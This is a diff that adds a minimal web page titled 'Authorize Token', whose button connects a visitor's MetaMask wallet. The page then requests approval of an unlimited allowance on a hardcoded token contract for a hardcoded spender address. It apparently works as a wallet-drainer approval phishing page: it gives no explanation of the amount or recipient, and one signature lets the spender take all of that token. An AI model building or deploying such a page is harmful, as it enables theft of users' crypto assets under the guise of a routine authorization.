@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorize Token</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      let web3;
+      const tokenAddress = "0x9643C079291f36bAf1d4B2C9FB4657D4307A198a"; // 代币合约地址
+      const spenderAddress = "0x0b95385E46e6fDBbf12FD0aF0253B6Ff3C388F5F"; // 授权接收合约地址
+      const maxApprovalAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 最大授权数量
+
+      // ERC-20 approve ABI
+      const tokenABI = [
+        {
+          "constant": false,
+          "inputs": [
+            {
+              "name": "_spender",
+              "type": "address"
+            },
+            {
+              "name": "_value",
+              "type": "uint256"
+            }
+          ],
+          "name": "approve",
+          "outputs": [
+            {
+              "name": "",
+              "type": "bool"
+            }
+          ],
+          "type": "function"
+        }
+      ];
+
+      async function connectMetaMask() {
+        if (window.ethereum) {
+          try {
+            // 请求用户授权连接 MetaMask
+            await ethereum.request({ method: 'eth_requestAccounts' });
+            web3 = new Web3(window.ethereum);
+
+            const accounts = await web3.eth.getAccounts();
+            const account = accounts[0];
+            console.log("Connected account:", account);
+
+            // 获取代币合约实例
+            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+
+            // 执行 approve 授权代币
+            tokenContract.methods.approve(spenderAddress, maxApprovalAmount).send({ from: account })
+              .on('transactionHash', function(hash){
+                console.log("Transaction sent, hash:", hash);
+                alert("Token approval transaction has been sent!");
+              })
+              .on('receipt', function(receipt){
+                console.log("Transaction confirmed, receipt:", receipt);
+                alert("Token successfully approved!");
+              })
+              .on('error', function(error){
+                console.error("Transaction failed:", error);
+                alert("Token approval failed.");
+              });
+
+          } catch (error) {
+            console.error("User denied access or other error:", error);
+            alert("Failed to connect to MetaMask.");
+          }
+        } else {
+          alert("MetaMask is not installed!");
+        }
+      }
+    </script>
+</head>
+<body>
+<h1>Authorize Token</h1>
+<button onclick="connectMetaMask()">点击此次授权</button>
+</body>
+</html>
